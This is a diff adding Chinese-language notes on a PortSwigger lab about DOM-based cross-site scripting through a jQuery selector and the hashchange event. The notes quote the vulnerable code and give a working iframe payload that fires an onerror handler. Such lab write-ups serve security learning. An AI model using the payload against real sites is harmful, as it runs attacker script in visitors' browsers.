@@ -1,0 +1,15 @@
+例子1:
+https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
+
+<script>
+      $(window).on('hashchange', function(){
+                 var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+                 if (post) post.get(0).scrollIntoView();
+         });
+ </script>
+ 通过DOM Invader无法找到，尝试用burp active scanner可以发现问题，那剩下的就是我们来分析一下它的上下文和如何触发的弹窗的问题了。
+ 首先我们看看什么时候才有可能进入这段代码，里面有个onhashchange event，也就是当url中带有hash，并且hash发生改变的时候才会触发。所以可以想到的一个方案就是用<iframe>
+ <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+ 第一次加载iframe的时候会先去load 设置好的src值，注意这里有个#，然后用onload事件去改变这个src,想当于改变了hash的值，所以也就触发了onhashchange事件。
+ 接着我们来分析一下它的上下文是在一个jquery下，
+ var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
